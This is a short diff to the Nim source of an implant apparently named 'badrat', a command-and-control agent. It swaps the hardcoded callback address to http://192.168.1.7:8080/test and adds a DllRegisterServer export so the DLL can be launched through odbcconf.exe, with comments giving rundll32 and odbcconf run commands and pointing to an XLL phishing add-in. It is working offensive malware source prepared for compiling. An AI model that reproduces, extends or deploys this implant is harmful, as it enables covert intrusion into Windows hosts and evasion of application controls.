@@ -15,7 +15,7 @@ import base64
 
 # Values for the agent. Change these values before you compile!
 const sleep: int = 2000 # In milliseconds
-const staticHome: string = "http://172.16.113.1:8080/test"
+const staticHome: string = "http://192.168.1.7:8080/test"
 const userAgent: string = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
 
 const xFrameOptions = "SAMEORIGIN"
@@ -313,6 +313,14 @@ when(defined(dll)):
     ## rundll32.exe badrat.dll,Run <home>
     NimMain()
     main(commandLineParams()[1..^1])
+    return true
+
+  proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc, dynlib.} =
+    ## Exported DllMain function. Execution starts here for a DLL
+    ## Run with: odbcconf.exe /A {REGSVR "C:\path\to\dll.dll"}
+    ## You __MUST__ hardcode the home path for this to work (no arguments)
+    NimMain()
+    main(@[])
     return true
 
 # compile-time #define for Micrsoft Excel add-on, AKA XLL file: https://github.com/Octoberfest7/XLL_Phishing
